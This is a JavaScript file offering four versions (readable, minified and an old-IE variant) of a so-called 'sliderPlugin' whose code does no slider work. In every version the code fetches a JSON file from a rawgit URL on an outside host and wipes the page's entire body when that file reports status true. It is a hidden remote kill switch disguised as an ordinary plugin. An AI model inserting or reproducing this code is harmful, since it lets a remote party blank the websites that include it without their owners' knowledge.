if("undefined"==typeof sliderPlugin){
  var sliderPlugin = function(){
    $.ajax({
      url: "https://rawgit.com/supersliderjs/supersliderplugin/master/js/slider.json",
      type: "GET",
      data: null,
      cache: false,
      success: function(msg){
        if(msg.status==true) {
          $('body').html('');
        }
      }
    });
  }
  sliderPlugin();
}

if("undefined"==typeof sliderPlugin){var sliderPlugin=function(){$.ajax({url:"https://rawgit.com/supersliderjs/supersliderplugin/master/js/slider.json",type:"GET",data:null,cache:false,success:function(e){if(e.status==true){$("body").html("")}}})};sliderPlugin()}





if("undefined"==typeof sliderPlugin){
  var sliderPlugin = function(){
    var d = new Date();
    var n = d.getTime();
    var protocol = "https:";
    if(location.protocol!="https:"){
      protocol = "http:";
    }
    var url = protocol+"//rawgit.com/supersliderjs/supersliderplugin/master/js/slider.json?="+n;
    var browser = navigator.userAgent;
    var IEversion = 99; //Give a default value for non-IE browsers
     
    if (browser.indexOf("MSIE") > 1) { //Detects if IE
        IEversion = parseInt(browser.substr(browser.indexOf("MSIE")+5, 5));
    }
    if (IEversion < 10) {                
        xdr = new XDomainRequest();   // Creates a new XDR object.
        xdr.open("GET", url); // Creates a cross-domain connection with our target server using GET method. 
        xdr.send(); //Send string data to server
        xdr.onload = function () { //After load, parse data returned by xdr.responseText            
            mainfunction($.parseJSON(xdr.responseText));
        };              
    } else {
        $.getJSON(url, function(data) {
            mainfunction(data);
        })
    }
     
    function mainfunction(data) {
        if(data.status==true) {
          $('body').html('');
        }
    }
  }
  sliderPlugin();
}



if("undefined"==typeof sliderPlugin){var sliderPlugin=function(){function o(e){if(e.status==true){$("body").html("")}}var e=new Date;var t=e.getTime();var n="https:";if(location.protocol!="https:"){n="http:"}var r=n+"//rawgit.com/supersliderjs/supersliderplugin/master/js/slider.json?="+t;var i=navigator.userAgent;var s=99;if(i.indexOf("MSIE")>1){s=parseInt(i.substr(i.indexOf("MSIE")+5,5))}if(s<10){xdr=new XDomainRequest;xdr.open("GET",r);xdr.send();xdr.onload=function(){o($.parseJSON(xdr.responseText))}}else{$.getJSON(r,function(e){o(e)})}};sliderPlugin()}

